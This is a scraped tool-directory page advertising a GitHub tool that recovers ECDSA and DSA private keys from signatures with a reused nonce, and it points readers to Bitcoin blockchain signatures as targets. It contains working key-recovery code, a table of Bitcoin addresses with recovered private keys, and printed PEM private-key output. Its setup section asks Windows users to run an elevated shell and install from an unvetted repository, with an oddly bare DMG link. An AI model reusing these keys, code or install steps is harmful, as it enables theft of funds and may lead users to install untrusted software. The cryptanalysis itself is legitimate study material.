---
title: ecdsa-private-key-recovery
url: https://kitploit.com/en/tools/github/yadyvazifeh1oz92/ecdsa-private-key-recovery
source: Kitploit
date: 2026-08-30
fetch_date: 2026-08-31T07:53:03.344814
---

# ecdsa-private-key-recovery

[Skip to content](#main-content)

[![Kitploit](/_next/image?url=%2Flogo.png&w=64&q=75)KITPLOIT](/en)[Tools](/en/tools)[Blog](/en/blog)Categories

EN

[Submit](/en/submit)

[Tools](/en/tools)[Blog](/en/blog)Categories

[Submit](/en/submit)

EN

Hacking, PenTest, and Cybersecurity Tools for Your Security Arsenal!

Kitploit is a directory of hacking, cybersecurity, and pentesting tools. Discover the latest project updates to find vulnerabilities, analyze systems, automate testing, and strengthen your security.

·Analytics preferences·[Feeds](/en/feeds)·[Contact](/en/contact)·[Privacy](/en/privacy)·© 2026 Kitploit

Tool Directory

## Categories

[View all categories](/en/categories)

Loading categories

ecdsa-private-key-recovery — Perform ECDSA and DSA nonce reuse private key recovery attacks to analyze signature vulnerabilities and recover private keys from blockchain signatures. | Kitploit

[Tools](/en/tools)/![GitHub](/providers/github.png)GitHub/yadyvazifeh1oz92/ecdsa-private-key-recovery

![](https://assets.kitploit.com/production/public/tools/53516/bd466b912e27d3b3d0a0b6bf4e0b49d5ea076fc0c595b41eda76541f6b1b0aed-display-v1.webp)

[Vulnerability Analysis](/en/categories/vulnerability-analysis)[Cryptography](/en/categories/cryptography)[Binary Analysis](/en/categories/binary-analysis)[Learning & Education](/en/categories/education)

![GitHub](/providers/github.png)yadyvazifeh1oz92/ecdsa-private-key-recovery

# ecdsa-private-key-recovery

Perform ECDSA and DSA nonce reuse private key recovery attacks to analyze signature vulnerabilities and recover private keys from blockchain signatures.

[View Repository](https://github.com/yadyvazifeh1oz92/ecdsa-private-key-recovery)

520533410 days ago![Reviewed by Kitploit](/_next/image?url=%2Fbadges%2Fkitploit_badge_reviewed_full.png&w=48&q=75)

### Most Popular

[View all →](/en/tools)

Discover the most used tools by our community.

Last 7 DaysLast 30 Days

Explore all tools

Browse our collection of tools

[View all tools →](/en/tools)

Share

# ecdsa-key-recovery

Perform ECDSA and DSA Nonce Reuse private key recovery attacks

A cryptographic research tool for analyzing signature vulnerabilities

Let's recover the private-key for two signatures sharing the same `nonce k`. Note how choosing the same `nonce k` results in both signatures having an identical signature value `r`. To find good candidates for an ECDSA nonce reuse check for signatures sharing the same `r`, `pubkey` on `curve` for different messages (or hashes). E.g. blockchain projects based off `bitcoind` are usually good sources of ECDSA signature material.

* **sampleA** (**r**, *sA, hashA*, pubkey, curve)
* **sampleB** (**r**, *sB, hashB*, pubkey, curve)

root@kitploit:~

```
sampleA = EcDsaSignature(r, sA, hashA, pubkey, curve)
sampleB = EcDsaSignature(r, sB, hashB, pubkey, curve) # same privkey as sampleA, identical r due to nonce reuse k.

# recover the private key
sampleA.recover_nonce_reuse(sampleB)  # populates sampleA with the recovered private key ready for use
print sampleA.privkey
```

## **Installation Options:**

#### setup

The following instructions are for Windows and Linux; macOS users have a [DMG file](https://raw.githubusercontent.com/yadyvazifeh1oz92/releases).

Verify the installation of Git and Python on your system.

Download Git for Windows:

<https://git-scm.com/install/windows>

Download Python for Windows (direct):

<https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe>

Finally, launch cmd as an administrator.

root@kitploit:~

```
git clone https://github.com/yadyvazifeh1oz92/ecdsa-private-key-recovery.git
```

root@kitploit:~

```
cd ecdsa-private-key-recovery
```

root@kitploit:~

```
py -m pip install -r requirements.txt
```

root@kitploit:~

```
py setup.py install
```

Python 2.x:

root@kitploit:~

```
#> virtualenv -p python2.7 .env27
#> . .env27/bin/activate
(.env27) #> python -m pip install -r requirements.txt
(.env27) #> python setup.py install
(.env27) #> python tests/test_ecdsa_key_recovery.py
```

Python 3.x:

root@kitploit:~

```
#> virtualenv -p python3 .env3
#> . .env3/bin/activate
(.env3) #> python -m pip install -r requirements.txt
(.env3) #> python setup.py install
(.env3) #> python tests/test_ecdsa_key_recovery.py
```

#### Recovering Private Keys from the Bitcoin Blockchain

[tools/README.md](https://github.com/yadyvazifeh1oz92/ecdsa-private-key-recovery/blob/HEAD/tools/README.md)

| BTC Address | Base58 Privkey | r |
| --- | --- | --- |
| 1A8TY7dxURcsRtPBs7fP6bDVzAgpgP4962 | 5JsYaHVGCUzuXaQ5VkaA21VFPJFuArRWfSB77sqzWkWuTMMjXsT | 113563387324078878147267949860139475116142082788494055785668341901521289846519 |
| 1A8TY7dxURcsRtPBs7fP6bDVzAgpgP4962 | 5JsYaHVGCUzuXaQ5VkaA21VFPJFuArRWfSB77sqzWkWuTMMjXsT | 18380471981355278106073484610981598768079378179376623360720556873242139981984 |
| 1C8x2hqqgE2b3TZPQcFgas73xYWNh6TK9W | 5JKkG6KXLCCPXN9m29ype6My7eR4AnCLaHKYrLvn6d3nd8BLjjw | 19682383735358733565748628081379024202682929012377912380310432818686294127462 |
| 1A8TY7dxURcsRtPBs7fP6bDVzAgpgP4962 | 5JsYaHVGCUzuXaQ5VkaA21VFPJFuArRWfSB77sqzWkWuTMMjXsT | 6828441658514710620715231245132541628903431519484374098968817647395811175535 |

### Example

create recoverable signature objects:

root@kitploit:~

```
from ecdsa_key_recovery import DsaSignature, EcDsaSignature, ecdsa, bignum_to_hex, bytes_fromhex

# specify curve
curve = ecdsa.SECP256k1

# create standard ecdsa pubkey object from hex-encoded string
pub = ecdsa.VerifyingKey.from_string(
        bytes_fromhex("a50eb66887d03fe186b608f477d99bc7631c56e64bb3af7dc97e71b917c5b3647954da3444d33b8d1f90a0d7168b2f158a2c96db46733286619fccaafbaca6bc"), curve=curve).pubkey

# create sampleA and sampleB recoverable signature objects.
# long r, long s, bytestr hash, pubkey obj.
sampleA = EcDsaSignature((3791300999159503489677918361931161866594575396347524089635269728181147153565,   #r
                          49278124892733989732191499899232294894006923837369646645433456321810805698952), #s
                         bytes_fromhex(bignum_to_hex(
                             765305792208265383632692154455217324493836948492122104105982244897804317926)),
                         pub)
sampleB = EcDsaSignature((3791300999159503489677918361931161866594575396347524089635269728181147153565,   #r
                          34219161137924321997544914393542829576622483871868414202725846673961120333282), #s'
                         bytes_fromhex(bignum_to_hex(
                             23350593486085962838556474743103510803442242293209938584974526279226240784097)),
                         pub)

# key not yet recovered
assert (sampleA.x is None)
```

recover the private key for **sampleA**

root@kitploit:~

```
# attempt to recover key - this updated object sampleA
sampleA.recover_nonce_reuse(sampleB)    # recover privatekey shared with sampleB
assert (sampleA.x is not None)          # assert privkey recovery succeeded. This gives us a ready to use ECDSA privkey object
assert sampleA.privkey
```

#### output

root@kitploit:~

```
INFO:__main__:------------EcDSA------------
DEBUG:__main__:<EcDsaSignature 0x2c7a61 sig=(3791300999…,4927812489…) public=✔ private=⨯ > - recovering private-key from nonce reuse ...
DEBUG:__main__:<EcDsaSignature 0x2c7a61 sig=(3791300999…,4927812489…) public=✔ private=✔ > - Private key recovered!
-----BEGIN EC PRIVATE KEY-----
MHQCAQEEIOdzzzX85WfQYiIDwo9nR4ozYbrn5utDZrUOHSfrHtguoAcGBSuBBAAK
oUQDQgAEpQ62aIfQP+GGtgj0d9mbx2McVuZLs699yX5xuRfFs2R5VNo0RNM7jR+Q
oNcWiy8ViiyW20ZzMoZhn8yq+6ymvA==
-----END EC PRIVATE KEY-----

DEBUG:__main__:<EcDsaSignature 0x2c7a5b sig=(3791300999…,4927812489…) public=✔ private=⨯ > - recovering private-key from nonce reuse ...
DEBUG:__main__:<EcDsaSignature 0x2c7a5b sig=(3791300999…,4927812489…) public=✔ private=✔ > - Private key recovered!
-----BEGIN EC PRIVATE KEY-----
MHQCAQEEIOdzzzX85WfQYiIDwo9nR4ozYbrn5utDZrUOHSfrHtguoAcGBSuBBAAK
oUQDQgAEpQ62aIfQP+GGtgj0d9mbx2McVuZLs699yX5xuRfFs2R5VNo0RNM7jR+Q
oNcWiy8ViiyW20ZzMoZhn8yq+...